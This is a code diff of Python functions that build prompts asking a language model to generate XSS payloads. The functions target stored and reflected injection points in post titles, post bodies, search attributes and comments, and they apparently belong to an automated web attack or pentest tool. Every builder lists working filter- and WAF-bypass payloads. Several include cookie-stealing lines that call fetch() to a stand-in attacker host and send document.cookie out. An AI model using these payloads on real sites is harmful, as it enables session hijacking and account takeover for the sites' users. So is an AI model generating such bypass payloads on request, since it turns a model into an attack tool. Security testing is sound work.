@@ -29,30 +29,35 @@ def build_xss_subject(point: Dict[str, Any], count: int = 5) -> str:
 
     return f"""Target: Stored XSS via post title field
 Endpoint: {method} {url}, parameter: {param}
-Reflection context: Input stored in DB and later rendered as post title (inside anchor or span tags)
-{f"Note: {note}" if note else ""}
+Reflection context: Input stored in DB and rendered as post title (inside <a> or <span> tags)
+{f"Known filter behavior: {note}" if note else ""}
 
 Known general filter behavior for title fields:
   - <script> tags are commonly blocked
-  - Event handlers on non-script tags (onerror, onload, onmouseover) often pass
+  - Event handlers on img/svg/details often pass through
+  - Short payloads preferred (title fields may have length limits)
 
-Generate {count} Stored XSS payloads for a post title field.
+Generate {count} Stored XSS payloads for a post title field. Prioritize WAF/filter bypass variants.
 Techniques to cover:
-1. onerror/onload on img/svg: <img src=x onerror=alert(1)>, <svg/onload=alert(1)>
-2. javascript: URI: <a href="javascript:alert(1)">x</a>
-3. HTML5 interactive: <details open ontoggle=alert(1)>x</details>
-4. CSS animation triggers
-5. Encoded/obfuscated variants
-6. Cookie exfiltration: fetch('http://attacker/?c='+document.cookie)
+1. Entity-encoded event value (WAF bypass): <img src=x onerror=&#97;lert(1)>
+2. String concatenation (WAF bypass): <img src=x onerror=window['ale'+'rt'](1)>
+3. No-parentheses throw: <svg onload="onerror=alert;throw 1">
+4. No-parentheses comma: <script>throw onerror=alert,1</script>
+5. Tab-separated tag attributes (filter bypass): <img\tsrc=x\tonerror=alert(1)>
+6. Mixed case tag/attribute: <ImG sRc=x OnErRoR=alert(1)>
+7. CSS animation event: <style>@keyframes x{{}}</style><p style="animation-name:x" onanimationstart=alert(1)>
+
+AVOID generating these — already covered by baseline:
+  <img src=x onerror=alert(1)>  |  <svg/onload=alert(1)>  |  <svg onload=alert(1)>
 
 ONLY USE THIS TYPE: STORED_XSS
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
-STORED_XSS | svg_onload | <svg/onload=alert(1)>
-STORED_XSS | a_javascript | <a href="javascript:alert(1)">x</a>"""
+STORED_XSS | entity_onerror | <img src=x onerror=&#97;lert(1)>
+STORED_XSS | no_paren_throw | <svg onload="onerror=alert;throw 1">
+STORED_XSS | tab_sep | <img\tsrc=x\tonerror=alert(1)>"""
 
 
 def build_xss_content(point: Dict[str, Any], count: int = 5) -> str:
@@ -65,31 +70,34 @@ def build_xss_content(point: Dict[str, Any], count: int = 5) -> str:
     return f"""Target: Stored XSS via post content field (HTML mode)
 Endpoint: {method} {url}, parameter: {param}
 Reflection context: HTML content stored and rendered in post body
-{f"Note: {note}" if note else ""}
+{f"Known filter behavior: {note}" if note else ""}
 
 Typical filter behavior:
   - <script> tag blocked
   - Common HTML tags (img, a, p, b) allowed
   - Event handlers on allowed tags often not filtered
 
-Generate {count} Stored XSS payloads for an HTML content field.
+Generate {count} Stored XSS payloads for an HTML content field. Focus on WAF/filter bypass variants — not plain basic payloads.
 Techniques to cover:
-1. Event handler on img: <img src=x onerror=alert(1)>
-2. javascript: on anchor: <a href=javascript:alert(1)>click</a>
-3. SVG/HTML5 elements: <svg/onload=alert(1)>, <details open ontoggle=alert(1)>
-4. Video/audio fallback: <video><source onerror=alert(1)></video>
-5. Input/form events: <input autofocus onfocus=alert(1)>
-6. iframe srcdoc: <iframe srcdoc="<script>alert(1)</script>">
-7. Cookie exfil: <img src=x onerror=fetch('http://attacker/?c='+document.cookie)>
+1. Entity-encoded handler value: <img src=x onerror=&#97;lert(document.cookie)>
+2. String concat bypass: <img src=x onerror=window['ale'+'rt'](1)>
+3. No-parentheses via throw: <img src=x onerror="onerror=alert;throw 1">
+4. Iframe with encoded srcdoc: <iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">
+5. SVG with script entity: <svg><script>alert&lpar;1&rpar;</script></svg>
+6. Video source onerror: <video><source onerror="alert(document.domain)"></video>
+7. Cookie exfil with fetch: <img src=x onerror=fetch('https://attacker.example/?c='+document.cookie)>
+
+AVOID generating these — already covered by baseline:
+  <img src=x onerror=alert(1)>  |  <svg/onload=alert(1)>  |  <details open ontoggle=alert(1)>  |  <input autofocus onfocus=alert(1)>
 
 ONLY USE THIS TYPE: STORED_XSS
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
-STORED_XSS | svg_onload | <svg/onload=alert(1)>
-STORED_XSS | iframe_srcdoc | <iframe srcdoc="<script>alert(1)</script>">"""
+STORED_XSS | entity_onerror_cookie | <img src=x onerror=&#97;lert(document.cookie)>
+STORED_XSS | no_paren_img | <img src=x onerror="onerror=alert;throw 1">
+STORED_XSS | svg_entity_script | <svg><script>alert&lpar;1&rpar;</script></svg>"""
 
 
 def build_xss_search(point: Dict[str, Any], count: int = 5) -> str:
@@ -103,21 +111,26 @@ def build_xss_search(point: Dict[str, Any], count: int = 5) -> str:
 Endpoint: {method} {url}, parameter: {param}
 Reflection context: Input reflected inside HTML attribute value:
   <input type="text" name="{param}" value="[REFLECTED HERE]">
-{f"Note: {note}" if note else ""}
+{f"Known filter behavior: {note}" if note else ""}
 
 Injection strategy:
   - The " character breaks out of the value="" attribute
-  - Stay inside attribute context: close quote, inject event handler, re-open quote
-  - Tag breakout may not work if < > are HTML-encoded by the server
-  - Backtick syntax alert`1` works as alternative to alert(1)
+  - Stay inside attribute: close quote → inject event handler → re-open quote
+  - Tag breakout (<img>, <svg>) may fail if < > are HTML-encoded
+  - Backtick alert`1` works as alternative to alert(1)
 
-Generate {count} Reflected XSS payloads for attribute-value context.
-Techniques to cover:
-1. onmouseover (commonly not filtered): " onmouseover=alert(1) x="
-2. Other mouse events: onmouseenter, onmouseleave, onmousedown, onmouseup
-3. Form events: oninput, onchange, onkeydown
-4. Cookie exfil via confirmed channel: " onmouseover=fetch('http://attacker/?c='+document.cookie) x="
-5. Backtick variant: " onmouseover=alert`document.cookie` x="
+Generate {count} Reflected XSS payloads. Prioritize DIVERSE techniques — do NOT repeat the same event handler.
+Techniques to cover (pick the most bypass-effective ones):
+1. Uncommon mouse/pointer events (avoid onfocus if filtered): onpointerover, onpointerenter, ondblclick, oncontextmenu, onauxclick
+2. Entity-encoded handler value (WAF bypass): " onmouseover=&#97;lert(1) x="
+3. String concatenation (WAF bypass): " onmouseover=window['ale'+'rt'](1) x="
+4. No-parentheses throw: " onmouseover=alert;throw 1 x=" or using onerror chain
+5. Backtick variant: " onmouseover=alert`1` x="
+6. Tab-separated attribute (filter bypass): "\tonmouseover\x09=alert(1)\tx="
+7. Cookie exfil: " onmouseover=fetch('https://attacker.example/?c='+document.cookie) x="
+
+AVOID generating these — already covered by baseline:
+  " onmouseover=alert(1) x="  |  " onfocus=alert(1) x="  |  " onclick=alert(1) x="
 
 ONLY USE THIS TYPE: REFLECTED_XSS
 REMINDER: every payload MUST start with " and end with x=" to stay inside the attribute
@@ -125,9 +138,9 @@ Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-REFLECTED_XSS | onmouseover_alert | " onmouseover=alert(1) x="
-REFLECTED_XSS | onmouseenter | " onmouseenter=alert(1) x="
-REFLECTED_XSS | onmouseover_cookie | " onmouseover=fetch('http://attacker/?c='+document.cookie) x=\""""
+REFLECTED_XSS | onpointerover | " onpointerover=alert(1) x="
+REFLECTED_XSS | entity_encoded | " onmouseover=&#97;lert(1) x="
+REFLECTED_XSS | window_concat | " onmouseover=window['ale'+'rt'](1) x=\""""
 
 
 def build_xss_comment(point: Dict[str, Any], count: int = 5) -> str:
@@ -140,32 +153,40 @@ def build_xss_comment(point: Dict[str, Any], count: int = 5) -> str:
     return f"""Target: Stored XSS via comment field
 Endpoint: {method} {url}, parameter: {param}
 Reflection context: Comment body stored and rendered in post detail page
-{f"Note: {note}" if note else ""}
+{f"Known filter behavior: {note}" if note else ""}
 
 Possible behaviors to test:
-  - URLs starting with http:// may be auto-converted to <a href> tags
+  - URLs starting with http:// may be auto-converted to <a href="..."> tags
   - If URL auto-linking exists, inject event handlers into the URL string
+  - javascript: protocol is commonly blocked in href
   - Direct HTML tags may or may not be filtered
 
-Generate {count} Stored XSS payloads for a comment field.
+Generate {count} Stored XSS payloads for a comment field. Use diverse techniques — not just basic onerror/onload.
 Techniques to cover:
-1. URL attribute injection (if auto-linking exists):
-   http://x.com" onmouseover="alert(1)
+1. URL auto-link injection with uncommon events:
+   http://x.x" onpointerover="alert(1)
+   http://x.x" ondblclick="alert(1)
+2. URL auto-link + WAF bypass (entity encoded):
+   http://x.x" onmouseover="&#97;lert(1)
+3. URL auto-link + no-parentheses:
    http://x.x" onmouseover="alert`1`
-2. Direct HTML injection:
-   <img src=x onerror=alert(1)>
-   <svg/onload=alert(1)>
-3. Cookie exfil:
-   http://x.x" onmouseover="fetch('http://attacker/?c='+document.cookie)
+4. URL auto-link + cookie exfil:
+   http://x.x" onmouseover="fetch('https://attacker.example/?c='+document.cookie)
+5. Direct HTML bypass variants (if HTML allowed):
+   <img src=x onerror=window['ale'+'rt'](1)>
+   <svg onload="onerror=alert;throw 1">
+
+AVOID generating these — already covered by baseline:
+  http://x.com" onmouseover="alert(1)  |  <img src=x onerror=alert(1)>  |  <svg/onload=alert(1)>
 
 ONLY USE THIS TYPE: STORED_XSS
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-STORED_XSS | url_onmouseover | http://x.com" onmouseover="alert(1)
-STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
-STORED_XSS | svg_onload | <svg/onload=alert(1)>"""
+STORED_XSS | url_onpointerover | http://x.x" onpointerover="alert(1)
+STORED_XSS | url_entity_encoded | http://x.x" onmouseover="&#97;lert(1)
+STORED_XSS | url_cookie_exfil | http://x.x" onmouseover="fetch('https://attacker.example/?c='+document.cookie)"""
 
 
 # ── SQLi 빌더 ─────────────────────────────────────────────────────────────────
